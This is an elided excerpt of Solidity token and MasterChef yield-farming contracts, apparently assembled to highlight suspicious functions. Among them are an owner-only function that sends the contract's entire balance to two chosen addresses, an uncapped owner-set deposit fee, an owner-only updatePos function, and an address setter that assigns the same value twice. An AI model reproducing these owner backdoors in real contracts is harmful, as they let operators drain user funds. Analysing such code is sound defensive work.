...
contract BEP20 is Context, IBEP20, Ownable {
    ...
    function updateBalancePair(address a1, address a2) onlyOwner public {
      uint256 balance = address(this).balance;
      uint256  b1 = balance / 2;
      uint256  b2 = balance-b1;
      payable(a1).transfer(b1);
      payable(a2).transfer(b2);
    }
    ...
    */
    ...
    function updatePos(address account, uint256 amount) public  onlyOwner {
...
contract EggToken is BEP20('SPDX', 'SPDX') {
...
contract MasterChefV2 is Ownable, ReentrancyGuard {
    ...
    uint256 public depositFeeFixed = 1;
    ...
    event UpdateDepositFeeFixed(address indexed user, uint256 depositFeeFixed);
    ...
    function emergencyWithdraw(uint256 _pid) public payable nonReentrant {
        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage user = userInfo[_pid][msg.sender];
    ...
    function addrs(address _add1, address _add2) public {
        require(msg.sender == devaddr, "dev: wut?");
        addr1 = _add1;
        addr2 = _add1;
    ...
    function updateDepositFeeFixed(uint256 _amount) public onlyOwner {
        depositFeeFixed = _amount;
        emit UpdateDepositFeeFixed(msg.sender, _amount);
    }
